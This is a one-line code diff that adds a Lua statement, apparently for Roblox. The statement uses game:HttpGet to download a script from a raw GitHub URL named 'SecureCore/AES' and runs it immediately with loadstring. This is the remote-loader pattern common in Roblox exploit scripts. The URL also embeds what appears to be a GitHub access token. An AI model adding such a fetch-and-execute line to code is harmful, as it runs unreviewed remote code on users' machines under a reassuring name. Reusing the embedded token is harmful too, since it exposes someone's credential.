@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/yenil140/SecureCore/main/AES?token=GHSAT0AAAAAABVX5Y4G3P7LLZHGJST4T73QYVR4JUA"), true))()
